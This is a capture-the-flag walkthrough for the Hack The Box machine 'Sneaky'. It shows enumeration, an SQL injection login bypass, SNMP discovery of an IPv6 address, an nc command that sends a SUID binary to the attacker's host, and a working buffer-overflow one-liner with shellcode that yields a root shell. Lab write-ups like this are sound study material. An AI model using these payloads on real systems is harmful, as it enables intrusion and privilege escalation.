
![logo](/logo.png)

# [Sneaky- BOX]  
Hi folks, today I am going to solve an medium rated hack the box machine which was released on 03 May 2017 as the 14th machine on HTB,Sneaky created by [trickster0](https://app.hackthebox.com/users/169).So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *bufferoverflow
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/sneaky 10.10.10.20
```

###### Output 

![](/Linux/Linux-Medium/Sneaky/Screenshots/nmap.png)

```sh
nmap -sV -sC -oA nmap/sneaky 10.10.10.20                                                                                          ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-18 10:58 EAT
Nmap scan report for 10.10.10.20
Host is up (0.37s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Under Development!
|_http-server-header: Apache/2.4.7 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.19 seconds
```

looking at the results  we find out that there are 1 ports open and its a `Ubuntu`and its running an `Apache httpd 2.4.7`. 

port[80]-http

when we naviagate to [http://10.10.10.20](http://10.10.10.20)  we find a page  `under devolpment`

![](/Linux/Linux-Medium/Sneaky/Screenshots/underdevs.png)

we find nothing of intreasting on the page so lets try enumerate directories with `gobuster` 

```sh
gobuster dir -u http://10.10.10.20 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -k 
```

![](/Linux/Linux-Medium/Sneaky/Screenshots/gobuster.png)

Imedialtely we find  a dev dierectory and upon looking at  it we find a page [http://10.10.10.20/dev/](http://10.10.10.20/dev/)
![](/Linux/Linux-Medium/Sneaky/Screenshots/dev.png)

# Exploitation

#### SQL Injection

SQL injection on the dev page is trivial. Simply passing `admin' OR '1'='1` as the password will completely bypass the login and reveal an SSH key as well as a system username.

![](/Linux/Linux-Medium/Sneaky/Screenshots/ssh.png)

```sh
curl -s http://10.10.10.20/dev/sshkeyforadministratordifficulttimes -o id_rsa
```

The issue now arises that there is seemingly no SSH server available on the target as nmap showed. so let repeat nmap to see if we can get anthing of `udp` 

```sh
nmap -sV -sC -sU -oA nmap/sneaky 10.10.10.20 
```

![](/Linux/Linux-Medium/Sneaky/Screenshots/udp.png)

we find a udp port that is open `161` and it is running an `SNMPV1` and `SNMPv3`

### SNMP

since snmp is availabe lets runn `snmpwalk` on the htb target but with an `Ipv4`  that we are using for to connect to HTB .

```sh
snmpwalk -Os -c public -v 1 10.10.10.20
```

![](/Linux/Linux-Medium/Sneaky/Screenshots/snmpwalk.png)

![](/Linux/Linux-Medium/Sneaky/Screenshots/unreaable.png)


since our output is not readable lets download an `add-on-package` to make our output readable

```sh
sudo apt install snmp-mibs-downloader
```

and then comment out the line in `/etc/snmp/snmp.conf`  comment the `mib:`

we can see an `IPv6` 

![](/Linux/Linux-Medium/Sneaky/Screenshots/readable.png)

#### something about IPV6
`dead:beef:0000:0000:0250:56ff:feb9:be08` is the globally routable address, and `fe80:0000:0000:0000:0250:56ff:feb9:be08` is the link-local address.

This address will change on each boot because of how HTB has the machines spawn in the lab (MACs aren’t consistent). I wrote a one-liner to capture the IPv6:

```sh
snmpwalk -v2c -c public 10.10.10.20 ipAddressIfIndex.ipv6 | cut -d'"' -f2 | grep 'de:ad' | sed -E 's/(.{2}):(.{2})/\1\2/g'
```

![](/Linux/Linux-Medium/Sneaky/Screenshots/oneliner.png)

![](/Linux/Linux-Medium/Sneaky/Screenshots/snm.png)

Now that we have the IP lets do an nmap to see if wee can find port 22 open for the ssh.But first just checking on the browser it looks like we can access the Ivp6

![](/Linux/Linux-Medium/Sneaky/Screenshots/Ivp6b.png)

```sh
nmap -6 -p- -sV -oA nmap/sneakyIvp6 dead:beef:0000:0000:0250:56ff:feb0:a425
```

![](/Linux/Linux-Medium/Sneaky/Screenshots/nmapipv6.png)

Now that port `22` is open we can `ssh` to it with the user earlier

![](/Linux/Linux-Medium/Sneaky/Screenshots/shell.png)

You can get the user flag now

![](/Linux/Linux-Medium/Sneaky/Screenshots/userflag.png)
#### Alternative Methods for Finding IPv6

# Privillge Escalation

Now that we got the shell let run `LinEnum` to find vulnerablility in the machine

![](/Linux/Linux-Medium/Sneaky/Screenshots/wget.png)

![](/Linux/Linux-Medium/Sneaky/Screenshots/suid.png)

Running LinEnum reveals a non-standard `SUID` binary at `/usr/local/bin/chal`. Attempting to run
the binary with a large argument produces a segmentation fault, and it is fairly obvious that it is
vulnerable to a buffer overflow exploit.

let's send the binary to our machine so that we can anlyze it .

```sh
nc -w 5 10.10.14.15 8000 < chal
```

![](/Linux/Linux-Medium/Sneaky/Screenshots/binary.png)

![](/Linux/Linux-Medium/Sneaky/Screenshots/chal.png)

Running the binary in gdb with a pattern reveals that the EIP offset is `362 bytes`. The buffer
appears to start roughly around 0xbffff760 in this case, so a return address of `0xbffff7b0` will be used in the payload to account for any shift in addresses. The target is little endian, so the return
address must be provided in reverse order.

The payload is very simple as far as buffer overflows as concerned. It is (with a `28 byte /bin/sh`
shellcode) a `334` byte long NOP sled, followed by the shellcode, and then the return address. The
following command will immediately grant a root shell.

```sh
chal $(python -c "print '\x90'*334 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + '\xb0\xf7\xff\xbf' ")
```

![](/Linux/Linux-Medium/Sneaky/Screenshots/rootflag.png)


	-------------------------END successful attack @lesley----------------------
